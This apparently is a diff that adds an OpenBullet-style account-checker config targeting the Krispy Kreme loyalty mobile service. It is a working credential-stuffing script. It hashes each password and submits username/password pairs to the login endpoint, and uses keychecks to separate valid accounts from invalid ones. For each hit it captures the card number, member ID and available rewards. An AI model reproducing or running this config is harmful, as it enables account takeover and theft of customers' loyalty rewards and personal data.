@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Krispy Kreme",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T14:13:57.5218953+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash MD5 "<PASS>" -> VAR "PASS2" 
+REQUEST GET "https://appmobile.loyalty3.com/LoyaltyMobile.svc/Login_new?callBack=jQuery20307512985034845769_1554209191237&username=<USER>&password=<PASS2>&_=1554209191242" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: com.loyalty3.krispykreme" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "cardNumber\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "responseMessage\":\"The Email or Card Number and Password you provided do not match" 
+    KEY "cardNumber\":\"\",\"" 
+PARSE "<SOURCE>" LR "cardNumber\":\"" "\",\"email\":\"" -> CAP "Card Number : " 
+PARSE "<SOURCE>" LR "cardNumber\":\"" "\",\"email\":\"" -> VAR "NUM" 
+PARSE "<SOURCE>" LR "memberId\":\"" "\",\"name" -> VAR "ID" 
+REQUEST GET "https://appmobile.loyalty3.com/LoyaltyMobile.svc/member_info?callBack=jQuery20307512985034845769_1554209191237&username=<NUM>&password=<PASS2>&memberId=<ID>&_=1554209191246" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "rewardDescription\":\"" "\",\"expirationDate" Recursive=TRUE -> CAP "Rewards : " 
